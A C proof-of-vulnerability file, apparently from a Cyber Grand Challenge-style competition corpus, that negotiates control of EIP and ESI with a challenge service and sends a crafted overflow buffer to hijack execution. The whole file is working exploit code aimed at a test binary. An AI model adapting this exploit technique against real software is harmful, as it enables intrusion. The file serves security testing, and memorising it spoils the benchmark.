/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
int main(void) {
   type1_vals t1vals;
   type1_negotiate(0xedededed, 0xededede5, 6, &t1vals); // ESI == 6, last byte is going to be off by 8
   unsigned int no_ed = 0x12121212; // have to prevent 0xed from each byte of EIP and REG
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\xd4\x7e\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x31\x33\x30\x30\x31\x33\x38\x38";
      static unsigned int write_00001_00000_len = 8;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x0f\x44\x00\x00\xcd\xcc\x3c\x40\x75\x4d\x68\x49\x65\x4e\x46\x51"
         "\x5a\x4b\x69\x7a\x62\x57\x6d\x41\x66\x53\x48\x70\x52\x62\x49\x56"
         "\x57\x4e\x56\x43\x66\x70\x51\x5a\x4c\x78\x6b\x7a\x4f\x7a\x61\x65"
         "\x77\x64\x56\x56\x54\x78\x43\x56\x6f\x62\x42\x51\x50\x66\x47\x76"
         "\x75\x64\x45\x51\x74\x4b\x6c\x72\x50\x67\x79\x59\x64\x56\x52\x4d"
         "\x6c\x50\x55\x57\x58\x41\x57\x4a\x62\x42\x69\x47\x41\x52\x55\x59"
         "\x77\x77\x59\x54\x58\x44\x43\x55\x42\x7a\x47\x76\x63\x6b\x6f\x52"
         "\x70\x5a\x69\x6b\x6b\x79\x71\x77\x6b\x67\x61\x66\x58\x6d\x61\x50"
         "\x56\x74\x52\x47\x45\x54\x62\x63\x41\x42\x43\x44\x45\x46\x47\x48";
      static unsigned int write_00002_00000_len = 144;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         transmit_all(1, write_00002, write_00002_len);
      }
      free(write_00002);
   } while (0);
   do {
      // # &desc_copy (EIP) -> JKLM
      //*** writing data
      unsigned int eip = t1vals.ipval | no_ed; 
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = append_buf(write_00003, &write_00003_len, (unsigned char*)&eip, 4);
      if (write_00003_len > 0) {
         transmit_all(1, write_00003, write_00003_len);
      }
      free(write_00003);
   } while (0);
   do {
      // # &p (ESI) -> (N+8)OPQ
      //*** writing data
      unsigned int reg = t1vals.regval | no_ed;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = append_buf(write_00004, &write_00004_len, (unsigned char*)&reg, 4);
      if (write_00004_len > 0) {
         transmit_all(1, write_00004, write_00004_len);
      }
      free(write_00004);

   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\xed";
      static unsigned int write_00005_00000_len = 1;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         transmit_all(1, write_00005, write_00005_len);
      }
      free(write_00005);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 2;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\xc4\xec\x4e\xee";
      static unsigned int write_00006_00000_len = 4;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         transmit_all(1, write_00006, write_00006_len);
      }
      free(write_00006);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x31\x33\x30\x30\x31\x33\x38\x38";
      static unsigned int write_00007_00000_len = 8;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         transmit_all(1, write_00007, write_00007_len);
      }
      free(write_00007);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 4;
      read_00002 = (unsigned char*)malloc(read_00002_len);
      int read_00002_res = length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 145;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x75\x4d\x68\x49\x65\x4e\x46\x51\x5a\x4b\x69\x7a\x62\x57\x6d\x41"
         "\x66\x53\x48\x70\x52\x62\x49\x56\x57\x4e\x56\x43\x66\x70\x51\x5a"
         "\x4c\x78\x6b\x7a\x4f\x7a\x61\x65\x77\x64\x56\x56\x54\x78\x43\x56"
         "\x6f\x62\x42\x51\x50\x66\x47\x76\x75\x64\x45\x51\x74\x4b\x6c\x72"
         "\x50\x67\x79\x59\x64\x56\x52\x4d\x6c\x50\x55\x57\x58\x41\x57\x4a"
         "\x62\x42\x69\x47\x41\x52\x55\x59\x77\x77\x59\x54\x58\x44\x43\x55"
         "\x42\x7a\x47\x76\x63\x6b\x6f\x52\x70\x5a\x69\x6b\x6b\x79\x71\x77"
         "\x6b\x67\x61\x66\x58\x6d\x61\x50\x56\x74\x52\x47\x45\x54\x62\x63"
         "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
         "\xed";
      read_00003_ptr += data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 145);
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 2;
      read_00004 = (unsigned char*)malloc(read_00004_len);
      int read_00004_res = length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\xff\xff\xff\xff";
      static unsigned int write_00008_00000_len = 4;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         transmit_all(1, write_00008, write_00008_len);
      }
      free(write_00008);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 2;
      read_00005 = (unsigned char*)malloc(read_00005_len);
      int read_00005_res = length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
